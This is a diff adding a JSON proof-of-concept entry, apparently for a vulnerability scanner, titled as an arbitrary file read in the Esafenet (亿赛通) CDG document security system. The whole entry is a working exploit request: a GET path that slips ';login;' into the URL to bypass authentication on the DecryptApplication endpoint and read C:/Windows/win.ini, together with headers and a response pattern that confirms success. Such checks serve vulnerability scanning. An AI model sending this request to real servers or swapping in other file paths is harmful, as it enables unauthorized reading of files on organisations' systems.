@@ -1,0 +1,14 @@
+{
+	"name":"亿赛通电子文档安全管理系统DecryptApplication任意文件读取",
+	"tag":"yisaitong",
+	"type":"other",
+	"poc":{
+		"pocGet":"/CDGServer3/client/;login;/DecryptApplication?command=ViewUploadFile&filePath=C:///Windows/win.ini&uploadFileId=1&fileName1=test1111",
+		"header":{
+			"User-Agent":"Mozilla/5.0 (Linux;",
+			"content-type":"text/plain"
+		},
+		"status_code":"200",
+		"pattern":"(extension)"
+	}
+}
